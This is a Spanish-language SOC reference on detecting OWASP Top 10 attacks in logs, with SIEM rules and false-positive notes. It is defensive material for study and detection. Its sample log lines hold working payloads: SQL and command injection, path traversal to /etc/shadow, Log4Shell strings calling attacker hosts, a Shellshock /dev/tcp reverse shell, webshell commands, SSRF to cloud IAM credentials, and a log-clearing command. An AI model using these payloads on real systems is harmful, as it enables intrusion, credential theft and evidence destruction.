Broken Access Control

CRÍTICO Access Control · IDOR · Path Traversal

El control de acceso falla cuando un usuario puede realizar acciones o acceder a recursos fuera de sus permisos. En logs se manifiesta como acceso exitoso (HTTP 200) a recursos ajenos, enumeración secuencial de IDs, o traversal de directorios.

Apache Access Log — IDOR
110.0.1.5 - alice [17/Mar/2025:14:22:01 +0000] "GET /api/v1/orders/8821 HTTP/1.1" 200 1024 "-" "Mozilla/5.0"propio
210.0.1.5 - alice [17/Mar/2025:14:22:02 +0000] "GET /api/v1/orders/8822 HTTP/1.1" 200 891 "-" "Mozilla/5.0"ajeno
310.0.1.5 - alice [17/Mar/2025:14:22:03 +0000] "GET /api/v1/orders/8823 HTTP/1.1" 200 1102 "-" "Mozilla/5.0"ajeno
410.0.1.5 - alice [17/Mar/2025:14:22:04 +0000] "GET /api/v1/orders/8824 HTTP/1.1" 200 934 "-" "Mozilla/5.0"ajeno
5203.0.113.42 - - [17/Mar/2025:11:33:17 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 2156traversal
6203.0.113.42 - - [17/Mar/2025:11:33:19 +0000] "GET /download?file=..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1" 200 1024traversal
7198.51.100.10 - - [17/Mar/2025:16:05:03 +0000] "GET /admin/users/delete?id=42 HTTP/1.1" 200 312 "-" "curl/7.68"priv esc
Indicadores clave
IDs secuencialesEl mismo usuario accede a IDs consecutivos en <1s — enumeración automática de recursos ajenos.
200 + recurso ajenoRespuesta exitosa a un recurso que no pertenece al usuario autenticado.
../ o %2F%2E%2EPath traversal en parámetros de descarga. Busca tanto formato URL-encoded como raw.
/admin sin rolAcceso a endpoints administrativos por usuarios sin privilegios — y con respuesta 200.
Correlación en SIEM
COUNT(user=X, endpoint LIKE '/api/*/orders/*') > 10 en 30s

URI CONTAINS '../' OR '../' encoded (%2F%2E, %2e%2e)

user_role != 'admin' AND URI CONTAINS '/admin' AND status = 200
⚠ Falsos positivos

Informes legítimos que generan muchas peticiones (exportación batch). Diferenciar por User-Agent (scripts internos vs navegador) y por si los IDs accedidos son propios del usuario.

Cryptographic Failures

ALTO Data Exposure · Weak TLS · Sensitive data in transit

Datos sensibles transmitidos sin cifrado o con cifrado débil. En logs de proxy o WAF se detecta por credenciales/tokens en parámetros GET (visibles en URL), tráfico HTTP a endpoints sensibles, o negociación de cifrados obsoletos (SSLv3, TLS 1.0, RC4).

Proxy / WAF Log — credenciales en claro
110.0.1.88 - - [15/Jan/2025:10:01:44 +0000] "POST /api/login HTTP/2.0" 200 512 — cipher=TLS_AES_256_GCM_SHA384
210.0.1.44 - - [15/Jan/2025:10:03:11 +0000] "GET /login?username=admin&password=P@ssw0rd! HTTP/1.1" 200 1823cred en URL
310.0.1.77 - - [15/Jan/2025:10:05:02 +0000] "http://internal-api.corp/v1/payments/confirm?api_key=sk_live_4xKjP9mNqR HTTP/1.1" 200 89token en GET
4192.0.2.5 - - [15/Jan/2025:10:07:30 +0000] "GET /api/profile HTTP/1.1" 200 2048 — cipher=TLS_RSA_WITH_RC4_128_MD5cipher débil
510.0.1.44 - - [15/Jan/2025:10:09:55 +0000] "GET /reset?token=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ. HTTP/1.1" 200 344JWT alg=none
Indicadores clave
password= en GETCredenciales en query string — quedan en logs de proxy, historial del navegador y cabeceras Referer.
api_key= / token= en URLSecretos en GET son extremadamente peligrosos: se loguean en todos los proxies intermedios.
http:// en APIs internasTráfico interno sin cifrar. Cualquier intermediario en la red puede leerlo.
RC4 / SSLv3 / TLS 1.0Cifrados rotos — susceptibles a BEAST, POODLE, DROWN. Busca en logs de cipher negotiation.
Correlación en SIEM
URI CONTAINS ('password=','passwd=','api_key=','token=','secret=')
AND method = 'GET'

cipher IN ('RC4','NULL','EXPORT','SSLv3','TLSv1.0')

dst_port = 80 AND URI CONTAINS '/api/'
⚠ Falsos positivos

Tokens de CSRF o session IDs en URLs de redirección OAuth (flujo legítimo). Revisar si el token es de corta duración y de un solo uso. Las APIs legacy internas en HTTP pueden ser intencionales pero deben documentarse.

Injection

CRÍTICO SQL · Command · LDAP · Log Injection

Datos no confiables enviados como parte de un comando o query. SQL injection es el más común: se detecta por metacaracteres SQL en parámetros, errores HTTP 500 tras intentos, y respuestas anómalamente grandes (dump de tabla). Command injection usa caracteres de shell (; | && ` $(...)).

Apache Access Log — SQL Injection
1185.220.101.55 - - [15/Jan/2025:09:14:20 +0000] "GET /products?id=1 HTTP/1.1" 200 4521
2185.220.101.55 - - [15/Jan/2025:09:14:31 +0000] "GET /products?id=1' HTTP/1.1" 500 234error SQL
3185.220.101.55 - - [15/Jan/2025:09:14:35 +0000] "GET /products?id=1' OR '1'='1 HTTP/1.1" 200 89012bypass + dump
4185.220.101.55 - - [15/Jan/2025:09:14:39 +0000] "GET /products?id=1 UNION SELECT username,password,3,4 FROM users-- HTTP/1.1" 200 45123UNION dump
5185.220.101.55 - - [15/Jan/2025:09:14:44 +0000] "GET /products?id=1; DROP TABLE users;-- HTTP/1.1" 500 312destructivo
6203.0.113.8 - - [15/Jan/2025:09:20:11 +0000] "GET /ping?host=8.8.8.8;cat /etc/passwd HTTP/1.1" 200 2210cmd inject
Indicadores clave
500 → 200 misma IPSecuencia error/éxito: el atacante sondea con una comilla, confirma el error SQL, luego explota.
Respuesta anómala en bytesUn endpoint normal devuelve 4 KB; un UNION SELECT devuelve 89 KB — dump de tabla completa.
UNION SELECT / OR 1=1Keywords SQL en parámetros de URL. Buscar también variantes encoded: %27, %20OR%20, %55NION.
; | && en parámetrosMetacaracteres de shell en parámetros que ejecutan comandos del SO.
Correlación en SIEM
URI MATCHES "(UNION|SELECT|INSERT|DROP|--|'|%27|OR%201=1)"
AND src_ip = anterior_500

status=500 SEGUIDO DE status=200
DESDE mismo src_ip EN < 60s

bytes_sent > (avg_bytes * 10)
AND misma URI base
⚠ Falsos positivos

Campos de búsqueda legítimos con nombres de artículos que contienen comillas (O'Brien, D&D). Las herramientas de pen-testing internas y los escáneres de vulnerabilidades también generarán estas alertas — filtrar por IP de origen autorizado.

Insecure Design

MEDIO Business Logic · Rate Limiting · Unbounded Consumption

Fallos en el diseño del sistema que permiten bypass de lógica de negocio o consumo ilimitado de recursos. Los logs muestran patrones de comportamiento anómalos: velocidad imposible, valores fuera de rango, o flujos que saltan etapas.

API Gateway Log — Business Logic Abuse
110.0.1.5 - user77 [20/Mar/2025:11:00:01 +0000] "POST /api/checkout HTTP/2.0" 200 512 body={"qty":1,"price":29.99}
210.0.1.5 - user77 [20/Mar/2025:11:00:01 +0000] "POST /api/checkout HTTP/2.0" 200 512 body={"qty":1,"price":-0.01}precio neg.
310.0.1.5 - user77 [20/Mar/2025:11:00:02 +0000] "POST /api/promo/apply HTTP/2.0" 200 89 body={"code":"SAVE10"} — applied=truecupón
410.0.1.5 - user77 [20/Mar/2025:11:00:02 +0000] "POST /api/promo/apply HTTP/2.0" 200 89 body={"code":"SAVE10"} — applied=truereutilizado
510.0.1.5 - bot_x [20/Mar/2025:11:00:03 +0000] "GET /api/tickets/avail HTTP/2.0" 200 1024 — 1823 req en 60sticket hoarding
610.0.1.5 - user77 [20/Mar/2025:11:00:05 +0000] "POST /api/payment HTTP/2.0" 200 128 — sin pasar por /api/cartflujo saltado
Indicadores clave
Valores negativos/extremosPrecios, cantidades o IDs negativos que la API acepta — fallo de validación de rangos.
Acción repetida sin cooldownMismo endpoint, mismo recurso, misma IP — sin que la API rechace el duplicado.
Flujo saltadoLlamada a /payment sin previa llamada a /cart — salto de etapa en el flujo de negocio.
Rate extremo desde 1 IPMiles de req/min desde misma IP — bot agotando inventario o ancho de banda.
Correlación en SIEM
misma (user + endpoint + resource) EN < 5s: ALERTA duplicado

body.price < 0 OR body.qty < 0: ALERTA valor inválido

POST /payment SIN previo POST /cart
DEL mismo session_id EN < 30s

COUNT(req) > 500 por minuto desde misma IP
⚠ Falsos positivos

Tests de integración automáticos del equipo de QA. Importaciones batch legítimas con valores aparentemente fuera de rango. Usuarios que navegan rápido entre páginas. Diferenciar por User-Agent y por si la IP está en rangos de testing.

Security Misconfiguration

ALTO Default Creds · Exposed Files · Directory Listing · Verbose Errors

Configuraciones por defecto sin endurecer, archivos sensibles accesibles, mensajes de error con stack traces, o paneles de administración expuestos. Los attackers reconocen primero — busca en logs accesos a rutas típicas de fingerprinting.

Nginx Access Log — Reconnaissance & Exposed Files
1203.0.113.42 - - [22/Mar/2025:08:00:01 +0000] "GET / HTTP/1.1" 200 8192
2203.0.113.42 - - [22/Mar/2025:08:00:03 +0000] "GET /.env HTTP/1.1" 200 1024creds expuesto
3203.0.113.42 - - [22/Mar/2025:08:00:04 +0000] "GET /phpinfo.php HTTP/1.1" 200 48291fingerprint
4203.0.113.42 - - [22/Mar/2025:08:00:05 +0000] "GET /.git/config HTTP/1.1" 200 312repo expuesto
5203.0.113.42 - - [22/Mar/2025:08:00:06 +0000] "GET /backup.sql HTTP/1.1" 200 5242880DB dump
6203.0.113.42 - - [22/Mar/2025:08:00:08 +0000] "GET /wp-admin/ HTTP/1.1" 200 18291admin panel
7203.0.113.42 - - [22/Mar/2025:08:00:10 +0000] "GET /api/swagger-ui.html HTTP/1.1" 200 45100API docs
Indicadores clave
/.env · /.git/ · /backupArchivos críticos expuestos. Si el status es 200 = brecha inmediata. El 403 no es suficiente — el archivo no debería existir en web root.
Scan de rutas conocidasMuchos accesos 404/403 a rutas comunes en poco tiempo — enumeración de wordlist (dirbuster, gobuster).
phpinfo.php / swaggerRevelan versiones de software, configuración de servidor, rutas internas — información para el atacante.
5 MB en backup.sqlLa respuesta descomunal (5 MB desde ruta inesperada) indica descarga de dump completo.
Correlación en SIEM
URI IN ('/.env','/.git/config','/backup.sql',
'/phpinfo.php','/.htpasswd','/web.config')
AND status = 200 → CRÍTICO

COUNT(status=404) > 50 en 60s
desde misma IP → escaneo

respuesta_bytes > 1MB
AND URI NOT IN rutas_conocidas
⚠ Falsos positivos

Escáneres de seguridad propios (Nikto, Nuclei), crawlers de motores de búsqueda accediendo a robots.txt y sitemap. Para /wp-admin y similares: verificar si la aplicación realmente usa WordPress — puede ser legítimo.

Vulnerable & Outdated Components

ALTO Log4Shell · Shellshock · CVE Exploitation

Explotación de vulnerabilidades conocidas en librerías o frameworks. Los payloads de CVEs famosos son muy reconocibles en logs — Log4Shell usa JNDI, Shellshock usa () { :;} en User-Agent. La firma es prácticamente única.

Apache / Java App Log — CVE Exploitation Attempts
145.33.32.156 - - [10/Dec/2024:06:11:02 +0000] "GET / HTTP/1.1" 200 8192 "${jndi:ldap://45.33.32.156:1389/a}" "Mozilla/5.0"Log4Shell
245.33.32.156 - - [10/Dec/2024:06:11:04 +0000] "GET / HTTP/1.1" 200 8192 "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/x}" "curl/7.68"Log4Shell bypass
3198.51.100.9 - - [10/Dec/2024:07:22:31 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 200 128 "-" "() { :; }; /bin/bash -i >& /dev/tcp/198.51.100.9/4444 0>&1"Shellshock
4192.0.2.100 - - [10/Dec/2024:08:01:15 +0000] "POST /struts2/login HTTP/1.1" 200 512 content-type="%{(#_='multipart/form-data').(#_memberAccess['allowStaticMethodAccess']=true)"Struts2
Indicadores clave
${jndi: en cualquier campoLog4Shell (CVE-2021-44228). Buscar en User-Agent, X-Forwarded-For, Referer, parámetros, cabeceras custom. También variantes encoded: %24%7bjndi%3a.
() { :;} en User-AgentShellshock (CVE-2014-6271). Antiguo pero aún se intenta — muchos servidores sin parchear.
JNDI callbacks en DNS/NetLog4Shell exitoso genera una conexión saliente del servidor víctima — correlacionar logs de red.
Correlación en SIEM
ANY_FIELD CONTAINS 'jndi:' OR '${' → Log4Shell

user_agent CONTAINS '() { :;}'
→ Shellshock

Log4Shell detectado EN app-server
+ conexión saliente a IP externa
desde app-server EN < 30s → EXPLOTACIÓN CONFIRMADA
⚠ Falsos positivos

Casi ninguno para estos patrones — son muy específicos. Los escáneres de vulnerabilidades propios pueden generar estas firmas. Crear lista blanca por IP de escáneres autorizados. Priorizar siempre como CRÍTICO hasta demostrar lo contrario.

Identification & Authentication Failures

CRÍTICO Brute Force · Credential Stuffing · Password Spray

Ataques contra el sistema de autenticación. Brute force: muchas contraseñas para un usuario. Credential stuffing: credenciales robadas de otras brechas. Password spray: una contraseña común contra muchos usuarios. El patrón temporal diferencia entre ellos.

auth.log — SSH Brute Force con éxito final
1Jan 15 08:00:01 CORP-DC01 sshd[12341]: Failed password for admin from 45.33.32.156 port 54231 ssh2intento 1
2Jan 15 08:00:02 CORP-DC01 sshd[12342]: Failed password for admin from 45.33.32.156 port 54232 ssh2intento 2
3Jan 15 08:00:03 CORP-DC01 sshd[12343]: Failed password for admin from 45.33.32.156 port 54233 ssh2intento 3
...[ 44 intentos fallidos en 44 segundos ]
47Jan 15 08:00:47 CORP-DC01 sshd[12401]: Accepted password for admin from 45.33.32.156 port 54301 ssh2ACCESO OK
48Jan 15 08:00:48 CORP-DC01 sshd[12401]: pam_unix(sshd:session): session opened for user admin by (uid=0)sesión root
49Jan 15 08:01:00 CORP-DC01 sshd[12501]: Failed password for root from 91.213.50.12 port 44100 ssh2spray
50Jan 15 08:01:01 CORP-DC01 sshd[12502]: Failed password for oracle from 91.213.50.12 port 44101 ssh2spray
Indicadores clave
N fallos → 1 éxitoLa secuencia fallo/éxito desde la misma IP es la firma definitiva del brute force exitoso. ALERT CRÍTICO.
Velocidad imposible para humano1 intento/segundo → bot. Un humano no puede escribir y conectar tan rápido.
Misma pass, múltiples usuariosPassword Spray: 1 contraseña contra admin, root, oracle, etc. — evita bloqueo de cuenta por IP.
Puerto cambia entre intentosCada intento SSH usa puerto de origen distinto — confirma que es un script automático.
Correlación en SIEM
COUNT("Failed password") > 5
GROUP BY src_ip, user EN < 5min
→ BRUTE_FORCE

"Failed password" SEGUIDO DE "Accepted password"
MISMO src_ip EN < 5min → CRÍTICO

COUNT(distinct user) > 3
FROM mismo src_ip EN < 60s → SPRAY
⚠ Falsos positivos

Usuarios que olvidan su contraseña (generan 3-5 intentos, no 50). IPs de NAT corporativas donde muchos usuarios comparten la misma IP de salida. Scripts de automatización con credenciales caducadas. Establecer umbral y lista blanca de IPs internas.

Software & Data Integrity Failures

ALTO Malicious Upload · Deserialization · Supply Chain

La aplicación procesa datos sin verificar su integridad. File upload sin validación de extensión permite cargar webshells. La deserialización insegura permite ejecución de código con payloads serializados (ysoserial para Java).

Apache + App Log — Malicious Upload & Webshell Access
110.0.1.5 - user3 [25/Mar/2025:14:10:01 +0000] "POST /upload HTTP/1.1" 200 312 filename="report.pdf"
210.0.1.5 - user3 [25/Mar/2025:14:10:45 +0000] "POST /upload HTTP/1.1" 200 312 filename="shell.php"webshell subida
3203.0.113.99 - - [25/Mar/2025:14:11:02 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 28webshell exec
4203.0.113.99 - - [25/Mar/2025:14:11:05 +0000] "GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 2156lectura /etc
5198.51.100.8 - - [25/Mar/2025:15:00:01 +0000] "POST /api/deserialize HTTP/1.1" 500 891 body="rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="Java deser
Indicadores clave
.php/.jsp/.aspx en uploadExtensiones ejecutables en endpoint de subida de archivos — webshell. Buscar también doble extensión: image.jpg.php.
GET /uploads/*.phpAcceso a un archivo recién subido en el directorio de uploads — ejecución confirmada.
rO0AB en POST bodyMagic bytes de Java serializado (base64 de 0xACED). Si el endpoint no debería recibir Java serializado, es un exploit.
cmd= / exec= en parámetrosParámetros típicos de webshells simplistas.
Correlación en SIEM
POST /upload AND filename ENDS_WITH
('.php','.jsp','.asp','.aspx','.sh')
AND status=200 → CRÍTICO

('.php','.jsp') → WEBSHELL ACTIVA

POST body CONTAINS 'rO0AB' (Java serial)
OR 'ACED0005' (hex) → DESER ATTACK
⚠ Falsos positivos

Entornos de desarrollo donde se suben scripts legítimos. Sistemas de gestión de contenido que permiten PHP plugins (WordPress). Crear lista blanca de usuarios con permiso explícito para subir ejecutables y alertar por cualquier otro.

Security Logging & Monitoring Failures

ALTO Log Deletion · Log Injection · Coverage Gaps

La ausencia de logs es en sí una señal de alerta. Los atacantes eliminan logs para cubrir sus huellas. En Windows, EventID 1102 indica borrado manual del log de Seguridad. Los gaps de tiempo en logs continuos (access.log sin entradas durante 30 min en hora punta) son igualmente sospechosos.

Windows Security Event Log — Log Cleared
1EventID=4624 2025-03-18T02:10:44Z Account: svc_maint LogonType=3 Src: 10.0.5.22
2EventID=4688 2025-03-18T02:11:01Z Process: cmd.exe User: svc_maint
3EventID=1102 2025-03-18T02:11:15Z The audit log was cleared User: svc_maint Src: 10.0.5.22log borrado
4[ siguiente entrada: 2025-03-18T03:42:01Z — GAP de 90 minutos ]gap sospechoso
5Apache: 10.0.1.5 - attacker [18/Mar:02:15:33 +0000] "GET /dashboard HTTP/1.1" 200 …\r\n10.0.2.9 - victim [18/Mar:02:15:33 +0000] "GET /logout HTTP/1.1" 200log injection
Indicadores clave
EventID 1102Borrado del Security Event Log en Windows. Siempre es intencional — los sistemas legítimos usan 1100 (servicio de auditoría detenido), no 1102.
Gap temporal en log continuoaccess.log sin entradas durante 30+ min en horario punta — el atacante eliminó o pausó el logging.
\r\n / %0a en input de usuarioLog injection: el atacante inyecta newlines para crear entradas de log falsas o eliminar rastros.
Correlación en SIEM
EventID = 1102 → CRÍTICO INMEDIATO
(nunca debería ocurrir en producción)

GAP(timestamp_actual - timestamp_anterior)
> 30min EN hora_punta → ALERTA

user_input CONTAINS '\r\n' OR '%0a' OR '%0d'
→ LOG INJECTION ATTEMPT

wevtutil cl Security → cmd malicioso
⚠ Falsos positivos

EventID 1100 (servicio de auditoría detenido) es parte del shutdown normal — no confundir con 1102. Los gaps pueden ocurrir durante reinicio de servidor o rotación de logs — verificar con logs de sistema si coincide con mantenimiento programado.

Server-Side Request Forgery (SSRF)

ALTO Cloud Metadata · Internal Network · DNS Rebinding

La aplicación hace peticiones HTTP a URLs controladas por el atacante, permitiendo acceder a recursos internos inaccesibles desde fuera. El indicador más claro: el servidor web hace peticiones salientes a 169.254.169.254 (metadata de AWS/Azure/GCP) o a rangos RFC 1918.

Proxy / App Log — SSRF hacia metadata de AWS
110.0.1.5 - user9 [28/Mar/2025:15:40:01 +0000] "GET /api/fetch?url=https://example.com/logo.png HTTP/1.1" 200 8192
210.0.1.5 - user9 [28/Mar/2025:15:44:01 +0000] "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 312AWS metadata
310.0.1.5 - user9 [28/Mar/2025:15:44:03 +0000] "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role HTTP/1.1" 200 891credenciales IAM
410.0.1.5 - user9 [28/Mar/2025:15:44:10 +0000] "GET /api/fetch?url=http://192.168.0.1/admin HTTP/1.1" 200 4521red interna
510.0.1.5 - user9 [28/Mar/2025:15:44:15 +0000] "GET /api/fetch?url=file:///etc/passwd HTTP/1.1" 200 2156file:// LFI
610.0.1.5 - user9 [28/Mar/2025:15:44:20 +0000] "GET /api/fetch?url=http://attacker.com@169.254.169.254/ HTTP/1.1" 200 312bypass whitelist
Indicadores clave
169.254.169.254Dirección de metadata de cloud (AWS, Azure, GCP). Cualquier petición del servidor a esta IP = SSRF confirmado. No hay caso legítimo de aplicación usuario-final accediendo a esta IP.
Peticiones a RFC 1918 desde webEl servidor app hace requests a 10.x, 172.16.x, 192.168.x — explorando red interna.
file:// en parámetros URLProtocolo file:// convierte SSRF en LFI (Local File Inclusion).
@ip en URLTécnica de bypass: http://trusted.com@169.254.169.254/ — el parser ve trusted.com, la petición va a la IP.
